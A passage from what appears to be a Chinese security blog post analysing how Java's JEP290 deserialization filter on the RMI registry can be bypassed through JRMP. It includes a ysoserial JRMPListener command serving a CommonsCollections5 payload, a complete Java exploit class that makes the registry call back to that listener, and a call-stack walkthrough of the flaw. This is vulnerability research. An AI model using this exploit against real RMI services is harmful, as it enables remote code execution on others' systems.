类，另一个是我们放入的恶意利用类 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>，第一次会先判断 <code>java.rmi.Remote</code> 类是否合法</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/JudgeRemote.png" class=""><p>对应的判断代码，其实也就是白名单了。代码会首先判断 <code>var2</code> 是否等于 <code>String</code> 类型。如果不是，则继续判断它是否满足下列几个条件中的任意一个：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">Number</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">UnicastRef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">RMIClientSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">RMIServerSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">ActivationID</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token constant">UID</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token class-name">Status</span><span class="token punctuation">.</span><span class="token constant">REJECTED</span> <span class="token operator">:</span> <span class="token class-name">Status</span><span class="token punctuation">.</span><span class="token constant">ALLOWED</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而这里，我们的 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类并不在这些白名单中，所以会被过滤</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/REJCTEDD.png" class=""><h2 id="0x04-JEP290-绕过"><a href="#0x04-JEP290-绕过" class="headerlink" title="0x04 JEP290 绕过"></a>0x04 JEP290 绕过</h2><p>这里我们可以先看一下白名单里面都能过什么，白名单如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">Number</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">UnicastRef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">RMIClientSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">RMIServerSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">ActivationID</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token class-name">UID</span><span class="token punctuation">.</span><span class="token keyword">class</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我觉得还是得从它在 JDK8u221 的具体环境下的流程分析入手，看一下在攻击流程之后哪里可以能够被利用，哪里可以 bypass</p><h3 id="绕过利用"><a href="#绕过利用" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>思考了在 RMI 的流程当中，哪一步能够绕过 JEP290 的检测，最终是 JRMP 的这一步，能够绕过，从原理图来说的话应该是这样</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/JRMP.png" class=""><p>先用 ysoserial 开启 JRMP 3333 端口的监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> ysoserial.jar ysoserial.exploit.JRMPListener <span class="token number">3333</span> CommonsCollections5 <span class="token string">"Calc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后编写 RMI 的 EXP</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRef</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span></span><span class="token class-name">LiveRef</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">.</span></span><span class="token class-name">TCPEndpoint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ObjID</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RemoteObjectInvocationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BypassJEP290</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Registry</span> reg <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rmi start at 2222</span>        <span class="token class-name">ObjID</span> id <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TCPEndpoint</span> te <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">3333</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// JRMPListener's port is 3333</span>        <span class="token class-name">UnicastRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> te<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RemoteObjectInvocationHandler</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectInvocationHandler</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Registry</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Registry</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">BypassJEP290</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Registry</span><span class="token punctuation">.</span><span class="token keyword">class</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        reg<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">,</span>proxy<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/Calc.png" class=""><p>这个 payload 的原理就是伪造了一个 <code>UnicastRef</code> 用于跟注册中心通信，我们从 <code>bind()</code> 方法开始分析一下这一整个流程。</p><h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>我们通过 <code>getRegistry</code> 时获得的注册中心，其实就是一个封装了 <code>UnicastServerRef</code> 对象的对象</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/Ref.png" class=""><p>当我们调用 <code>bind</code> 方法后，会通过 <code>UnicastRef</code> 对象中存储的信息与注册中心进行通信</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/nweBind.png" class=""><p>这里会通过 ref 与注册中心通信，并将绑定的对象名称以及要绑定的远程对象发过去，注册中心在后续会对应进行反序列化</p><p>接着来看看 yso 中的 JRMPClient 是做了什么操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ObjID</span> id <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// RMI registry</span><span class="token class-name">TCPEndpoint</span> te <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">UnicastRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> te<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">RemoteObjectInvocationHandler</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectInvocationHandler</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Registry</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Registry</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">JRMPClient</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Registry</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> proxy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里返回了一个代理对象，上面用的这些类都在白名单里，当注册中心反序列化时，会调用到<code>RemoteObjectInvacationHandler</code>父类<code>RemoteObject</code>的<code>readObject</code>方法（因为<code>RemoteObjectInvacationHandler</code>没有<code>readObject</code>方法），在<code>readObject</code>里的最后一行会调用<code>ref.readExternal</code>方法，并将<code>ObjectInputStream</code>传进去：</p><p>这里的调用栈非常长，总体上来说就是在做我上面所说的工作，调用栈如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">readObject<span class="token operator">:</span><span class="token number">455</span><span class="token punctuation">,</span> <span class="token class-name">RemoteObject</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">)</span>invoke0<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token class-name">DelegatingMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">498</span><span class="token punctuation">,</span> <span class="token class-name">Method</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>invokeReadObject<span class="token operator">:</span><span class="token number">1170</span><span class="token punctuation">,</span> <span class="token class-name">ObjectStreamClass</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>readSerialData<span class="token operator">:</span><span class="token number">2178</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>readOrdinaryObject<span class="token operator">:</span><span class="token number">2069</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>readObject0<span class="token operator">:</span><span class="token number">1573</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>defaultReadFields<span class="token operator">:</span><span class="token number">2287</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>readSerialData<span class="token operator">:</span><span class="token number">2211</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>readOrdinaryObject<span class="token operator">:</span><span class="token number">2069</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>readObject0<span class="token operator">:</span><span class="token number">1573</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>readObject<span class="token operator">:</span><span class="token number">431</span><span class="token punctuation">,</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">)</span>     <span class="token comment">// 从此处开始，会遇到很多字节码不匹配的问题</span>dispatch<span class="token operator">:</span><span class="token number">92</span><span class="token punctuation">,</span> <span class="token class-name">RegistryImpl_Skel</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">)</span>oldDispatch<span class="token operator">:</span><span class="token number">469</span><span class="token punctuation">,</span> <span class="token class-name">UnicastServerRef</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">)</span>dispatch<span class="token operator">:</span><span class="token number">301</span><span class="token punctuation">,</span> <span class="token class-name">UnicastServerRef</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token class-name">Transport</span>$<span class="token number">1</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">197</span><span class="token punctuation">,</span> <span class="token class-name">Transport</span>$<span class="token number">1</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">)</span>doPrivileged<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">AccessController</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>security<span class="token punctuation">)</span>serviceCall<span class="token operator">:</span><span class="token number">196</span><span class="token punctuation">,</span> <span class="token class-name">Transport</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">)</span>handleMessages<span class="token operator">:</span><span class="token number">573</span><span class="token punctuation">,</span> <span class="token class-name">TCPTransport</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">)</span>run0<span class="token operator">:</span><span class="token number">834</span><span class="token punctuation">,</span> <span class="token class-name">TCPTransport</span>$<span class="token class-name">ConnectionHandler</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">)</span>lambda$run$<span class="token number">0</span><span class="token operator">:</span><span class="token number">688</span><span class="token punctuation">,</span> <span class="token class-name">TCPTransport</span>$<span class="token class-name">ConnectionHandler</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1330984495</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">.</span></span>TCPTransport</span>$<span class="token class-name">ConnectionHandler</span>$$<span class="token class-name">Lambda</span>$<span class="token number">5</span><span class="token punctuation">)</span>doPrivileged<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">AccessController</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>security<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">687</span><span class="token punctuation">,</span> <span class="token class-name">TCPTransport</span>$<span class="token class-name">ConnectionHandler</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">)</span>runWorker<span class="token operator">:</span><span class="token number">1149</span><span class="token punctuation">,</span> <span class="token class-name">ThreadPoolExecutor</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">624</span><span class="token punctuation">,</span> <span class="token class-name">ThreadPoolExecutor</span>$<span class="token class-name">Worker</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">748</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一路跟进到 <code>sun.rmi.transport.LiveRef#read</code></p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/read.png" class=""><p>可以看到这里把 payload 里所传入的 <code>LiveRef</code> 解析到 <code>var5</code> 变量处，里面包含了 <code>ip</code> 与 <code>端口</code> 信息(JRMPListener 的端口)。这些信息将用于后面注册中心与 JRMP 端建立通信。</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/newLiveRefReturn.png" class=""><p>跟进 <code>saveRef()</code> 方法，里面做了一个映射，其建立了一个 <code>TCPEndpoint</code> 到 <code>ArrayList&lt;LiveRef&gt;</code> 的映射关系。</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/saveRef.png" class=""><p>到这里 JRMP 的通信流程基本结束了，接着再回到 <code>dispatch()</code> 方法，在调用了 <code>readObject</code> 方法之后调用了 <code>var2.releaseInputStream();</code>，跟进</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/releaseInputStream.png" class=""><p><code>releaseInputStream()</code> 方法调用了 <code>this.in.registerRefs()</code> 方法，跟进。其中先判断了当前保存的 Ref 是否为空，再获取当前 Ref，这个 Ref 实际上就是创建的 JRMP 连接，再跟进 <code>registerRefs()</code> 方法</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/registerRefs.png" class=""><p>var2这里返回的是 DGCClient 对象，里边同样封装了我们的端口信息</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/lookup.png" class=""><p>接着看到 <code>registerRefs</code> 方法中的 <code>this.makeDirtyCall(var2, var3);</code>，跟进一下</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/makeDirtyCall.png" class=""><p>里面主要是做了数据处理，将原本保存了 EndPoint 的 var1 —— HashSet 数组转换为 ObjID，同时，调用了 <code>this.dgc.dirty()</code> 方法，跟进。</p><p>在 <code>dirty()</code> 方法中调用 <code>wirteObject()</code> 方法后，会用 <code>invoke()</code> 将数据发出去。</p><p><code>invoke()</code> 方法实现的过程就是从 socket 连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置 filter（白名单），所以这里可以直接导致注册中心 rce，所以我们可以伪造一个 socket 连接并把我们恶意序列化的对象发过去，这也就是当时用 ysoserial 开启的 JRMP</p><img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/FInalReadObject.png" class=""><p>至此绕过分析结束</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本身 JEP290 的绕过分析的思路是非常清晰的，但是整个流程还是比较复杂的，总结一下是从 RMI 通信的流程当中找到了可乘之机。</p><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link"   href="https://xz.aliyun.com/t/8706" >https://xz.aliyun.com/t/8706<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;浅谈 JEP290&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
</feed>
